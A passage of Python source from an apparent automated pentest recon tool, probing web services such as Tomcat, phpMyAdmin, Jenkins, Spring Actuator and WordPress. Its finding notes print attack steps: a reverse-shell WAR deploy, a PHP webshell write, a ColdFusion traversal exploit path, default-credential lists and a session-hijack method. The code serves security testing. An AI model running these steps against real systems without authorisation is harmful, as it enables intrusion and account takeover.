        findings.bullet("**testssl findings:**")
        for line in hits[:20]:
            findings.bullet(f"  {line}")


# ── CORS misconfiguration ────────────────────────────────────────────────────

def _check_cors(base_url: str, runner: Runner, findings: Findings):
    """Check for CORS misconfiguration — reflected origin with credentials."""
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-H", "Origin: https://evil-p0rtix.com",
         "-I", base_url],
        capture_output=True, text=True,
    )
    acao = ""
    acac = ""
    for line in result.stdout.splitlines():
        ll = line.lower()
        if "access-control-allow-origin" in ll:
            acao = line.strip()
        if "access-control-allow-credentials" in ll:
            acac = line.strip()
    if not acao:
        return
    if "evil-p0rtix.com" in acao or acao.endswith("*"):
        severity = "**CORS: wildcard or reflected origin**" if "*" in acao else "**CORS: origin reflected**"
        findings.h4("CORS Misconfiguration")
        findings.bullet(f"{severity}: `{acao}`")
        if acac:
            findings.bullet(f"  `{acac}`")
        if "evil-p0rtix.com" in acao and "true" in acac.lower():
            findings.add_summary(f"**CORS: credentialed cross-origin read** at `{base_url}`")
            findings.note(
                "Exploit: victim must be authenticated to target. "
                "Host JS that calls `fetch(target_url, {credentials:'include'})` and exfils response."
            )
        else:
            findings.add_summary(f"CORS misconfiguration at `{base_url}`")


# ── Tomcat manager probe ──────────────────────────────────────────────────────

def _check_tomcat(base_url: str, ip: str, runner: Runner, findings: Findings,
                  host_header: str | None = None,
                  catchall: tuple[str, str] | None = None):
    """Detect Tomcat manager — 401 = exists, 200 = no auth."""
    found: list[tuple[str, str, str]] = []
    for path, label in _TOMCAT_PATHS:
        code = _probe_code(f"{base_url}{path}", host_header, catchall)
        if code in ("200", "401", "403", "302"):
            found.append((path, label, code))

    if not found:
        return

    findings.h4("Apache Tomcat")
    for path, label, code in found:
        if code == "200":
            findings.bullet(f"**{label} ACCESSIBLE (no auth):** `{base_url}{path}`")
            findings.add_summary(f"**Tomcat manager open (no auth)** at `{base_url}{path}` — WAR upload = RCE")
        elif code == "401":
            findings.bullet(f"**{label}:** `{base_url}{path}` — HTTP 401 (auth required)")
            findings.add_summary(f"Tomcat manager at `{base_url}{path}` — try default creds")
        else:
            findings.bullet(f"{label}: `{base_url}{path}` — HTTP {code}")

    if any(c in ("200", "401") for _, _, c in found):
        findings.note(
            "Default creds: tomcat:tomcat, admin:admin, tomcat:s3cret, admin:s3cret, manager:manager. "
            "With access: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war` "
            f"→ `curl -u admin:admin {base_url}/manager/text/deploy?path=/shell --upload-file shell.war` "
            f"→ `curl {base_url}/shell/`"
        )


# ── phpMyAdmin probe ──────────────────────────────────────────────────────────

def _check_phpmyadmin(base_url: str, runner: Runner, findings: Findings,
                      host_header: str | None = None,
                      catchall: tuple[str, str] | None = None):
    """Detect phpMyAdmin installation."""
    for path in _PMA_PATHS:
        code = _probe_code(f"{base_url}{path}", host_header, catchall)
        if code in ("200", "302"):
            findings.h4("phpMyAdmin")
            findings.bullet(f"**phpMyAdmin detected:** `{base_url}{path}`")
            findings.add_summary(f"phpMyAdmin at `{base_url}{path}` — try root/'', root/root, root/toor")
            findings.note(
                "With access: `SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` "
                "(requires FILE privilege + write access to webroot)"
            )
            return


# ── Splunk probe ──────────────────────────────────────────────────────────────

def _check_splunk(base_url: str, runner: Runner, findings: Findings,
                  host_header: str | None = None,
                  catchall: tuple[str, str] | None = None):
    """Detect Splunk Web — default creds: admin/changeme."""
    for path in _SPLUNK_PATHS:
        if _probe_code(f"{base_url}{path}", host_header, catchall) in ("200", "302", "301"):
            findings.h4("Splunk")
            findings.bullet(f"**Splunk Web detected:** `{base_url}{path}`")
            findings.add_summary(f"Splunk at `{base_url}` — default: admin/changeme. UF on 8089 = RCE via app")
            findings.note(
                "Test default creds: admin/changeme. "
                "Admin access on Universal Forwarder (port 8089) → deploy malicious app → RCE as SYSTEM. "
                "Tool: SplunkWhisperer2 / PySplunkWhisperer2_remote.py"
            )
            return


# ── GraphQL probe ─────────────────────────────────────────────────────────────

def _check_graphql(base_url: str, runner: Runner, findings: Findings):
    """Detect GraphQL endpoint and attempt introspection."""
    for path in _GRAPHQL_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8",
             "-X", "POST", "-H", "Content-Type: application/json",
             "-d", '{"query":"{__typename}"}',
             "-w", "\n%{http_code}",
             f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        lines = r.stdout.rsplit("\n", 1)
        code = lines[-1].strip() if len(lines) > 1 else "000"
        body = lines[0] if len(lines) > 1 else r.stdout

        if code not in ("200", "400") or not body.strip():
            continue
        if "__typename" not in body and "errors" not in body.lower() and "graphql" not in body.lower():
            continue

        findings.h4("GraphQL")
        findings.bullet(f"**GraphQL endpoint:** `{base_url}{path}`")
        findings.add_summary(f"GraphQL at `{base_url}{path}` — probe for introspection and injection")

        # Attempt introspection
        r2 = subprocess.run(
            ["curl", "-sk", "--max-time", "10",
             "-X", "POST", "-H", "Content-Type: application/json",
             "-d", '{"query":"{__schema{types{name}}}"}',
             f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if "__schema" in r2.stdout:
            findings.bullet("**Introspection enabled** — full schema accessible")
            findings.note(
                f"Dump schema: "
                f'`curl -X POST {base_url}{path} -H "Content-Type: application/json" '
                f"-d '{{\\\"query\\\":\\\"{{__schema{{types{{name,fields{{name}}}}}}}}\\\"}}' | python3 -m json.tool`"
            )
        else:
            findings.bullet("Introspection disabled — probe field suggestions with typos")
            findings.note(
                f'Field suggestion probe: `curl -X POST {base_url}{path} '
                f'-H "Content-Type: application/json" -d \'{{\"query\":\"{{ usr {{ id }} }}\"}}\' `'
                " — look for 'Did you mean' in response"
            )
        return


# ── Spring Boot Actuator probe ────────────────────────────────────────────────

def _spring_detected(base_url: str, fp: dict, host_header: str | None) -> bool:
    """True when the app looks like Spring Boot — server/powered-by header, or a
    Whitelabel Error Page / Spring Security login in the landing or /error body."""
    blob = f"{fp.get('server', '')} {fp.get('powered_by', '')}".lower()
    if "spring" in blob:
        return True
    for path in ("", "/error", "/login"):
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8"] + _hh(host_header) + [f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        body = (r.stdout or "").lower()
        if any(m in body for m in _SPRING_MARKERS):
            return True
    return False


def _parse_actuator_sessions(body: str) -> list[str]:
    """Pull usernames out of an /actuator/sessions response. The endpoint maps live
    session IDs to a principal; the JSON shape varies by version, so grab the common
    principal/username/user fields. Returns de-duplicated usernames."""
    users: list[str] = []
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        data = None
    if isinstance(data, dict):
        # Spring's shape is {"<sessionid>": {"principal": "<user>", ...}, ...} or
        # {"sessions": [{"principalName": "<user>"}, ...]}.
        candidates = list(data.values())
        if isinstance(data.get("sessions"), list):
            candidates = data["sessions"]
        for entry in candidates:
            if isinstance(entry, dict):
                for key in ("principal", "principalName", "username", "user", "lastRequest"):
                    val = entry.get(key)
                    if isinstance(val, str) and val.strip() and key != "lastRequest":
                        users.append(val.strip())
                        break
    # Regex fallback for non-JSON / flattened bodies.
    if not users:
        for m in re.finditer(r'"(?:principal(?:Name)?|username|user)"\s*:\s*"([^"]+)"', body):
            users.append(m.group(1).strip())
    return list(dict.fromkeys(u for u in users if u))


def _check_spring_actuator(base_url: str, fp: dict, runner: Runner, findings: Findings,
                           host_header: str | None = None,
                           catchall: tuple[str, str] | None = None):
    """Probe Spring Boot Actuator endpoints when the app fingerprints as Spring.

    Recon only: surfaces exposed actuators as findings and promotes any usernames
    leaked by /actuator/sessions to user facts (feeds the cross-protocol reuse
    spray). /actuator/sessions leaking a JSESSIONID→username map is a direct
    session-hijack foothold (CozyHosting); /env + /heapdump commonly leak secrets."""
    if not _spring_detected(base_url, fp, host_header):
        return

    found: list[tuple[str, str, bool]] = []
    for path, sensitive in _SPRING_ACTUATOR_PATHS:
        code = _probe_code(f"{base_url}{path}", host_header, catchall)
        if code in ("200", "401", "403"):
            found.append((path, code, sensitive))

    if not found:
        return

    findings.h4("Spring Boot Actuator")
    findings.add_summary(f"**Spring Boot Actuator exposed** at `{base_url}/actuator` — "
                         "check /env, /sessions, /heapdump for secrets and live sessions")
    leaked_users: list[str] = []
    for path, code, sensitive in found:
        if code == "200":
            tag = " — **sensitive (secrets/sessions)**" if sensitive else ""
            findings.bullet(f"**{path}** — HTTP 200 (open){tag}")
            # /actuator/sessions (or /sessions): map JSESSIONID→username = hijack.
            if path.endswith("sessions"):
                body = subprocess.run(
                    ["curl", "-sk", "--max-time", "10"] + _hh(host_header)
                    + [f"{base_url}{path}"],
                    capture_output=True, text=True,
                ).stdout
                names = _parse_actuator_sessions(body)
                for name in names:
                    _record_user(runner, name)
                leaked_users.extend(names)
        else:
            findings.bullet(f"{path} — HTTP {code} (present, auth required)")

    if leaked_users:
        names = ", ".join(f"`{u}`" for u in dict.fromkeys(leaked_users))
        findings.bullet(f"**/actuator/sessions leaks live sessions** — users: {names}")
        findings.add_summary(f"Spring Actuator /sessions leaks usernames ({names}) + live "
                             "JSESSIONIDs — session hijack into the authenticated app")
    findings.note(
        "Spring Actuator endpoints: `/actuator/env` & `/actuator/configprops` often leak "
        "credentials/secrets; `/actuator/heapdump` is a full memory dump (grep for tokens, "
        "JDBC strings); `/actuator/sessions` maps a live `JSESSIONID` to a username — set that "
        "cookie to hijack the session. `/actuator/mappings` reveals the route surface."
    )


def _coldfusion_detected(base_url: str, fp: dict, host_header: str | None) -> bool:
    """True when the app looks like Adobe ColdFusion / JRun — server header, or a
    CFIDE reference / ColdFusion marker in the landing body."""
    blob = f"{fp.get('server', '')} {fp.get('powered_by', '')}".lower()
    if "jrun" in blob or "coldfusion" in blob:
        return True
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "8"] + _hh(host_header) + [base_url],
        capture_output=True, text=True,
    )
    body = (r.stdout or "").lower()
    return "/cfide/" in body or "coldfusion" in body


def _check_coldfusion(base_url: str, fp: dict, runner: Runner, findings: Findings,
                      host_header: str | None = None,
                      catchall: tuple[str, str] | None = None):
    """Probe Adobe ColdFusion (JRun) admin endpoints.

    Recon only: surfaces the CFIDE admin as a finding and points at CVE-2010-2861
    (unauthenticated directory traversal → admin password-hash leak). Always
    probes the small CFIDE path set — the JRun/ColdFusion banner shows on its own
    port (default 8500) but the CFIDE admin is frequently reverse-proxied onto
    80/443, so a header gate would miss it; the probe is cheap and catch-all aware."""
    found: list[tuple[str, str, str]] = []
    for path, label in _COLDFUSION_PATHS:
        code = _probe_code(f"{base_url}{path}", host_header, catchall)
        if code in ("200", "301", "302", "401", "403"):
            found.append((path, code, label))

    # A bare-header detection with no live CFIDE path is still worth a note.
    detected = bool(found) or _coldfusion_detected(base_url, fp, host_header)
    if not detected:
        return

    findings.h4("Adobe ColdFusion (JRun)")
    findings.add_summary(f"**Adobe ColdFusion / JRun** at `{base_url}` — check "
                         "CVE-2010-2861 (admin directory traversal → password-hash leak)")
    for path, code, label in found:
        findings.bullet(f"**{path}** — HTTP {code} ({label})")
    findings.note(
        "ColdFusion 8/9 (JRun) — CVE-2010-2861 unauthenticated directory traversal leaks the "
        "admin password hash:\n"
        "`/CFIDE/administrator/enter.cfm?locale=../../../../../../../../ColdFusion8/lib/"
        "password.properties%00en` (try `CFusionMX7`/`JRun4`/`ColdFusion9` roots too). "
        "Crack/replay the SHA1 hash to log into `/CFIDE/administrator/`, then get RCE via a "
        "scheduled task writing a CFML shell, or the FCKeditor upload "
        "(`exploit/windows/http/coldfusion_fckeditor`)."
    )


# ── ADCS probe ────────────────────────────────────────────────────────────────

def _check_adcs(base_url: str, ip: str, runner: Runner, findings: Findings,
                host_header: str | None = None,
                catchall: tuple[str, str] | None = None):
    found: list[tuple[str, str]] = []
    for path in _ADCS_PATHS:
        code = _probe_code(f"{base_url}{path}", host_header, catchall)
        if code in ("200", "301", "302", "401", "403"):
            found.append((path, code))

    if found:
        findings.h4("ADCS (AD Certificate Services)")
        findings.bullet("**ADCS web enrollment detected!**")
        findings.add_summary(f"**ADCS web enrollment** at `{base_url}` — check ESC1-8")
        for path, code in found:
            findings.bullet(f"  `{base_url}{path}` — HTTP {code}")
        findings.note(
            f"Check for ESC1-8 vulnerabilities: "
            f"`certipy-ad find -u USER@DOMAIN -p PASS -dc-ip {ip} -vulnerable -stdout`"
        )


# ── WordPress ─────────────────────────────────────────────────────────────────

def _wp_author_enum(base_url: str, runner: Runner, findings: Findings) -> list[str]:
    """Enumerate WordPress usernames without wpscan — the REST users endpoint and
    the classic `?author=N` redirect. Pushes each into the users fact (for the
    cross-protocol reuse spray) and returns them. Works even when wpscan is absent."""
    users: list[str] = []

    # 1. REST API: /wp-json/wp/v2/users → [{"slug": "admin", ...}, ...]
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "10", f"{base_url}/wp-json/wp/v2/users"],
        capture_output=True, text=True,
    )
    body = r.stdout.strip()
    if body.startswith("[") or body.startswith("{"):
        try:
            data = json.loads(body)
            for entry in data if isinstance(data, list) else [data]:
                slug = (entry.get("slug") or entry.get("name") or "").strip()
                if slug:
                    users.append(slug)
        except (ValueError, AttributeError):
            pass

    # 2. ?author=N redirect → Location: /author/<username>/
    for n in range(1, 11):
        r = subprocess.run(
            ["curl", "-sk", "-I", "--max-time", "8", f"{base_url}/?author={n}"],
            capture_output=True, text=True,
        )
        m = re.search(r"[Ll]ocation:.*?/author/([^/\s?]+)", r.stdout)
        if m:
            users.append(m.group(1).strip())

    seen: list[str] = []
    for u in users:
        if u and u not in seen:
            seen.append(u)
            _record_user(runner, u)
    if seen:
        findings.bullet(f"**WordPress users:** {', '.join(f'`{u}`' for u in seen)} "
                        "(→ users fact for reuse spray)")
        findings.add_summary(f"WordPress users: {', '.join(seen)}")
    return seen


def _wpscan(base_url: str, runner: Runner, findings: Findings):
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
         "-w", "%{http_code}", f"{base_url}/wp-login.php"],
        capture_output=True, text=True,
    )
    if result.stdout.strip() not in ("200", "302"):
        return

    findings.h4("WordPress (wpscan)")
    # Always run the lightweight author enum (→ users facts), even if wpscan
    # itself finds nothing or its findings only get printed.
    wp_users = _wp_author_enum(base_url, runner, findings)

    cmd = ["wpscan", "--url", base_url, "--enumerate", "p,u,t,cb,dbe",
           "--no-banner", "--disable-tls-checks"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_wpscan", timeout=300)

    # wpscan's own "User(s) Identified" block → users facts too.
    in_users = False
    for line in out.splitlines():
        if "User(s) Identified" in line:
            in_users = True
        elif in_users:
            m = re.match(r"\s*\[[+i]\]\s+([A-Za-z0-9._-]+)\s*$", line)
            if m:
                _record_user(runner, m.group(1))
            elif line.strip() and not line.lstrip().startswith("|"):
                in_users = False
        if any(kw in line for kw in ("[!]", "[+]", "vulnerability", "Vulnerability",
                                      "Username", "version")):
            findings.bullet(line.strip())


# ── CMS detection — Joomla + Drupal ─────────────────────────────────────────

def _check_cms(base_url: str, runner: Runner, findings: Findings, available: set[str],
               host_header: str | None = None,
               catchall: tuple[str, str] | None = None):
    # Joomla — admin panel at /administrator/
    if _probe_code(f"{base_url}/administrator/", host_header, catchall) in ("200", "302", "301"):
        findings.h4("CMS: Joomla")
        findings.bullet(f"**Joomla admin panel:** `{base_url}/administrator/`")
        if "joomscan" in available:
            cmd = ["joomscan", "--url", base_url]
            findings.cmd(" ".join(cmd))
            out = runner.run(cmd, f"web_{_label(base_url)}_joomscan", timeout=300)
            for line in out.splitlines():
                if any(kw in line for kw in ("[++]", "[+]", "Vulnerable", "CVE", "version",
                                              "Admin", "Interesting")):
                    findings.bullet(line.strip())

    # Drupal — multiple indicators
    drupal_indicators = [
        ("/CHANGELOG.txt",           "Drupal CHANGELOG.txt"),
        ("/misc/drupal.js",          "Drupal JS asset"),
        ("/sites/default/settings.php", "Drupal settings.php"),
        ("/core/CHANGELOG.txt",      "Drupal 8+ CHANGELOG"),
    ]
    drupal_found = False
    for path, label in drupal_indicators:
        r2 = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if r2.stdout.strip() == "200":
            if not drupal_found:
                findings.h4("CMS: Drupal")
                drupal_found = True
            findings.bullet(f"**{label}:** `{base_url}{path}`")

    if drupal_found:
        findings.note(
            "Drupal detected — enumerate version/modules manually: check "
            "`CHANGELOG.txt` / `core/CHANGELOG.txt` for the version and run "
            "nuclei's drupal templates (droopescan is abandoned and broken on "
            "Python 3.12+, so it is no longer wired in)"
        )


# ── Jenkins probe ─────────────────────────────────────────────────────────────

def _check_jenkins(base_url: str, runner: Runner, findings: Findings):
    """Probe for exposed Jenkins endpoints — /script console = unauthenticated RCE."""
    found: list[tuple[str, str, str]] = []
    for path, label in _JENKINS_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code = r.stdout.strip()
        if code in ("200", "302", "301", "403"):
            found.append((path, label, code))

    if not found:
        return

    # Confirm it's actually Jenkins, not a coincidental 200
    r_check = subprocess.run(
        ["curl", "-sk", "--max-time", "10", base_url],
        capture_output=True, text=True,
    )
    if "Jenkins" not in r_check.stdout and "hudson" not in r_check.stdout.lower():
        return

    findings.h4("Jenkins")
    for path, label, code in found:
        if code == "200" and path in ("/script", "/manage"):
            findings.bullet(f"**{label} ACCESSIBLE (HTTP {code}):** `{base_url}{path}`")
        else:
            findings.bullet(f"{label}: `{base_url}{path}` — HTTP {code}")

    if any(p == "/script" and c == "200" for p, _, c in found):
        findings.bullet("**CRITICAL: Script console accessible without auth — RCE**")
        findings.add_summary(f"**CRITICAL: Jenkins /script RCE** at `{base_url}/script`")
        findings.note(
            f"Execute OS commands: POST to `{base_url}/script` with "
            f"`script=println(['id'].execute().text)`"
        )
    if any(p == "/api/json" and c == "200" for p, _, c in found):
        findings.bullet("**Jenkins REST API accessible (no auth)** — enum jobs/builds")


# ── Next.js enumeration ───────────────────────────────────────────────────────

def _check_nextjs(base_url: str, runner: Runner, findings: Findings):
    """Extract Next.js build ID, probe _next/data routes, and dump __NEXT_DATA__."""
    findings.h4("Next.js")

    result = subprocess.run(
        ["curl", "-sk", "--max-time", "15", base_url],
        capture_output=True, text=True,
    )
    html = result.stdout

    # Build ID — unlocks /_next/data/<buildId>/<page>.json routes
    build_id: str | None = None
    m = re.search(r'"buildId"\s*:\s*"([^"]+)"', html)
    if m:
        build_id = m.group(1)
        findings.bullet(f"Build ID: `{build_id}`")

    # Inline __NEXT_DATA__ JSON — contains props/pageProps passed to the page
    m_data = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
    if m_data:
        try:
            nd = json.loads(m_data.group(1))
            findings.bullet("**`__NEXT_DATA__`** present — inline page state:")
            for key in ("props", "pageProps", "query", "runtimeConfig"):
                val = nd.get(key)
                if val:
                    findings.bullet(f"  `{key}`: {str(val)[:300]}")
        except Exception:
            pass

    # Probe /_next/data/<buildId>/index.json — pre-rendered page payload
    if build_id:
        data_url = f"{base_url}/_next/data/{build_id}/index.json"
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}", data_url],
            capture_output=True, text=True,
        )
        lines = r.stdout.rsplit("\n", 1)
        code = lines[-1].strip() if len(lines) > 1 else "000"
        body = lines[0] if len(lines) > 1 else r.stdout
        if code == "200":
            findings.bullet(f"**Pre-rendered data exposed:** `/_next/data/{build_id}/index.json`")
            findings.add_summary(f"Next.js pre-rendered data at `/_next/data/{build_id}/index.json`")
            if body.strip():
                findings.code_block(body[:800])

    # Check accessibility of standard Next.js paths
    for path in ("/_next/static/", "/_next/data/"):
        r2 = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code2 = r2.stdout.strip()
        if code2 not in ("404", "000", ""):
            findings.bullet(f"`{path}` — HTTP {code2}")


# ── Directory bust ────────────────────────────────────────────────────────────

def _ffuf_extensions(fp: dict) -> list[str]:
    """Return appropriate ffuf -e extension args based on detected framework."""
    server = fp.get("server", "").lower()
    powered_by = fp.get("powered_by", "").lower()
    if fp.get("is_nextjs"):
        return ["-e", ".json"]
    if fp.get("is_php") or "php" in powered_by:
        return ["-e", ".php,.html,.txt,.xml,.json,.bak"]
    if "iis" in server or "asp" in powered_by:
        return ["-e", ".asp,.aspx,.html,.txt,.xml,.config"]
    if "node" in server or "node" in powered_by or "express" in powered_by:
        return ["-e", ".json"]
    return ["-e", ".php,.html,.txt,.xml,.json"]


def _dir_bust(base_url: str, runner: Runner, findings: Findings, fp: dict,
              breadth: Breadth = Breadth.STANDARD, host_header: str | None = None,
              catchall: tuple[str, str] | None = None):
    wl = web_wordlist("dirs", breadth)
    if not wl:
        findings.bullet("⚠ no dir-bust wordlist found (install seclists) — dir busting skipped")
        return

    # On a catch-all-redirect host every path returns the same 30x; filter that
    # status too so the bust isn't thousands of identical redirect lines.
    fc = "404"
    if catchall and catchall[0] not in ("404",):
        fc = f"404,{catchall[0]}"

    findings.h4(f"Directory Bust ({breadth.label})")
    cmd = [
        "ffuf", "-u", f"{base_url}/FUZZ",
        "-w", wl,
        "-fc", fc,
        "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT,
        "-ic",
        "-noninteractive",
    ] + _hh(host_header)
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_dirs", timeout=int(_FFUF_TIMEOUT))
    hits = _print_ffuf(out, findings)
    # Fetch response body for 500 paths with non-trivial content — often reveals framework/CVE
    for path, status, size in hits:
        if status == "500" and int(size) > 150:
            br = subprocess.run(
                ["curl", "-sk", "--max-time", "10"] + _hh(host_header) + [f"{base_url}/{path}"],
                capture_output=True, text=True,
            )
            body = br.stdout.strip()
            if body:
                findings.note(f"`/{path}` response body (500):")
                findings.code_block(body[:800])


# ── cewl custom wordlist generation ──────────────────────────────────────────

def _run_cewl(base_url: str, runner: Runner, findings: Findings) -> str | None:
    """
    Generate a site-specific wordlist by harvesting words from the target.
    Returns the path to the wordlist file, or None if cewl produced nothing.
    """
    wl_path = runner.ws.loot_dir / f"cewl_{_label(base_url)}.txt"
    cmd = ["cewl", base_url, "-d", "2", "-m", "5", "-w", str(wl_path),
           "--lowercase", "--with-numbers"]
    findings.cmd(" ".join(cmd))
    runner.run(cmd, f"web_{_label(base_url)}_cewl", timeout=120)

    if wl_path.exists() and wl_path.stat().st_size > 0:
        line_count = len(wl_path.read_text().splitlines())
        findings.bullet(f"cewl generated {line_count} custom words → `{wl_path}`")
        return str(wl_path)
    return None


def _dir_bust_cewl(base_url: str, wordlist: str, runner: Runner, findings: Findings, fp: dict):
    """Second dir bust pass using the cewl-generated wordlist (deep mode only)."""
    findings.h4("Directory Bust (cewl wordlist)")
    cmd = [
        "ffuf", "-u", f"{base_url}/FUZZ",
        "-w", wordlist,
        "-fc", "404",
        "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT,
        "-ic",
        "-noninteractive",
    ] + _ffuf_extensions(fp)
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_cewl", timeout=int(_FFUF_TIMEOUT))
    _print_ffuf(out, findings)


# ── API endpoint discovery ────────────────────────────────────────────────────

def _api_bust(base_url: str, runner: Runner, findings: Findings,
              breadth: Breadth = Breadth.STANDARD):
    wl = web_wordlist("api", breadth) or web_wordlist("dirs", breadth)
    if not wl:
        return
    api_prefixes = ["/api", "/v1", "/v2", "/api/v1", "/api/v2", "/rest", "/graphql"]

    active_prefixes: list[str] = []
    for prefix in api_prefixes:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{prefix}"],
            capture_output=True, text=True,
        )
        if result.stdout.strip() not in ("404", "000", ""):
            active_prefixes.append(prefix)

    if not active_prefixes:
        return

    findings.h4("API Endpoints")
    for prefix in active_prefixes:
        cmd = [
            "ffuf", "-u", f"{base_url}{prefix}/FUZZ",
            "-w", wl,
            "-fc", "404",
            "-t", str(_FFUF_THREADS),
            "-timeout", _REQ_TIMEOUT,
            "-ic",
            "-noninteractive",
        ]
        findings.cmd(" ".join(cmd))
        out = runner.run(
            cmd,
            f"web_{_label(base_url)}_api{prefix.replace('/', '_')}",
            timeout=300,
        )
        results = _FFUF_RE.findall(out)
        if results:
            findings.bullet(f"**`{prefix}`** — {len(results)} endpoint(s):")
            for path, status, size in results:
                findings.bullet(f"  `{prefix}/{path}` — {status} ({size}b)")


# ── Vhost bust ────────────────────────────────────────────────────────────────

def _vhost_bust(ip: str, port: int, scheme: str, domain: str,
                runner: Runner, findings: Findings,
                breadth: Breadth = Breadth.STANDARD) -> list[str]:
    wl = web_wordlist("vhost", breadth)
    if not wl:
        findings.bullet("⚠ no vhost wordlist found (install seclists) — vhost busting skipped")
        return []

    baseline = _vhost_baseline(ip, port, scheme)
    url = _build_url(scheme, ip, port)

    findings.h4(f"Vhost Bust ({breadth.label})")
    cmd = [
        "ffuf", "-u", url,
        "-H", f"Host: FUZZ.{domain}",
        "-w", wl,
        "-fc", "404",
        "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT,
        "-ic",
        "-noninteractive",
    ]
    if baseline > 0:
        cmd += ["-fs", str(baseline)]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(url)}_ffuf_vhosts", timeout=300)

    found: list[str] = []
    for match in _FFUF_RE.finditer(out):
        sub, status, size = match.group(1), match.group(2), match.group(3)
        full = f"{sub}.{domain}"
        findings.bullet(f"**`{full}`** — {status} ({size}b)")
        found.append(full)

    return found


def _vhost_baseline(ip: str, port: int, scheme: str) -> int:
    url = _build_url(scheme, ip, port)
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10",
         "-o", "/dev/null", "-w", "%{size_download}",
         "-H", "Host: p0rtix-baseline-probe.invalid", url],
        capture_output=True, text=True,
    )
    try:
        return int(result.stdout.strip())
    except ValueError:
        return 0


# ── Crawl ─────────────────────────────────────────────────────────────────────

def _crawl(base_url: str, scope: Scope, runner: Runner, findings: Findings,
           host_header: str | None = None):
    findings.h4("Crawl")
    cmd = ["gospider", "-s", base_url, "-c", "5", "-d", "2", "-t", "10",
           "--include-subs", "--no-redirect", "-q"]
    if host_header:
        cmd += ["-H", f"Host: {host_header}"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_gospider", timeout=_CRAWL_TIMEOUT)
    if "[TIMEOUT after" in out:
        findings.bullet(f"⏱ crawl (gospider) timed out after {_CRAWL_TIMEOUT}s — "
                        "partial/no crawl results; dir & vhost busting above are unaffected")

    in_scope, out_of_scope = _parse_gospider(out, scope)

    js_urls = [u for u in in_scope if u.lower().endswith(".js")]
    if js_urls:
        _scrape_js(base_url, js_urls, runner, findings)

    if in_scope:
        findings.bullet(f"**In-scope URLs:** {len(in_scope)}")
        for url in sorted(set(in_scope))[:30]:
            findings.bullet(f"  {url}")
        if len(in_scope) > 30:
            findings.bullet(f"  … and {len(in_scope) - 30} more (see raw output)")

    if out_of_scope:
        findings.h4("External Links (not scanned)")
        for url in sorted(set(out_of_scope))[:20]:
            findings.bullet(url)


def _parse_gospider(output: str, scope: Scope) -> tuple[list[str], list[str]]:
    url_re = re.compile(
        r"\[(?:url|javascript|form|linkfinder|robots|sitemap)\]\s+-\s+\[.*?\]\s+-\s+\[(.+?)\]"
    )
    raw_urls = [m.group(1).strip() for m in url_re.finditer(output)]
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("http") and line not in raw_urls:
            raw_urls.append(line)
    return scope.filter_urls(raw_urls)


# ── JS file analysis ─────────────────────────────────────────────────────────

# Endpoint references inside JS source. The old version only matched absolute
# `"/path"` strings; these also catch relative app routes (`scan.php`) and the
# ajax-call idioms that name them — `$.get('scan.php')`, `fetch("api/x")`,
# `axios.post('/y')` — so loot hidden behind a JS-only endpoint is followed.
_JS_ENDPOINT_RES = [
    re.compile(r'''["'](/[A-Za-z0-9/_.\-]{2,80})["']'''),                 # absolute paths
    re.compile(r'''(?:fetch|axios(?:\.\w+)?|\.(?:get|post|ajax|load|getJSON))'''
               r'''\s*\(\s*["']([^"']{2,120})["']''', re.I),             # ajax-style call args
    re.compile(r'''["']([A-Za-z0-9_./\-]{2,80}\.(?:php|asp|aspx|jsp|do|action|json|cgi))'''
               r'''(?:\?[^"']*)?["']'''),                                # relative file refs
]

# Static assets aren't worth following (no loot, just noise).
_ASSET_EXT = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
              ".woff", ".woff2", ".ttf", ".eot", ".map", ".mp4", ".webp")


def _scrape_js(base_url: str, js_urls: list[str], runner: Runner, findings: Findings):
    if not js_urls:
        return
    findings.h4("JS File Analysis")
    followups: set[str] = set()
    for url in js_urls[:20]:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "10", url],
            capture_output=True, text=True,
        )
        content = result.stdout
        if not content.strip():
            continue
        matches = _JS_SECRET_RE.findall(content)
        endpoints: list[str] = []
        for rx in _JS_ENDPOINT_RES:
            for m in rx.findall(content):
                m = m.strip()
                if m and m not in endpoints and not m.startswith(("http://", "https://", "//")):
                    endpoints.append(m)
        if matches:
            findings.bullet(f"**`{url}`** — possible secrets:")
            for val in matches[:5]:
                findings.bullet(f"  ⚠ `{val[:60]}`")
